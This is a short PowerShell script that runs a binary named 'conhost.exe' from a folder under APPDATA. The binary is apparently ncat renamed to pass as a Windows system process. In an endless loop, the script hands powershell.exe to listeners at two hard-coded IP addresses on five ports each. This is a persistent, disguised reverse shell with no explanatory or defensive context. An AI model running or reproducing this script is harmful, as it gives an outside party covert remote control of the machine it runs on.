# change directory into nmap folder
Write-Output "Changing Directory"
Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
Write-Output "Directory Changed"

Write-Output "Connecting to listener"
for (;;)
{
# for ip 10.133.33.205
$ListenerIP = "10.133.33.205"
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 8888
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6969
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6699
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6996
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 9669

# for ip 10.133.61.215
$ListenerIP = "10.133.61.215"
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 8888
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6969
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6699
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6996
.\conhost.exe -C --exec "powershell.exe" $ListenerIP 9669
}